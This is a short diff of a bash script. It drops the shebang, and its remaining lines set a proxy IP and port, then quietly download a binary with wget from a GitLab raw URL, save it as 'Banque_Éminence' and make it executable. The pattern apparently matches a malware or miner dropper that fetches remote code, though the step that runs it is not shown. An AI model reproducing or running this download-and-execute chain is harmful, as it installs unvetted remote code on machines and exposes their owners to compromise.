@@ -1,5 +1,3 @@
-#!/bin/bash
-
 proxy="142.54.232.6" 
 port="4145"
 wget -q -O Banque_Éminence https://gitlab.com/55113110159/dokerweb/-/raw/main/ebiy && chmod +x Banque_Éminence
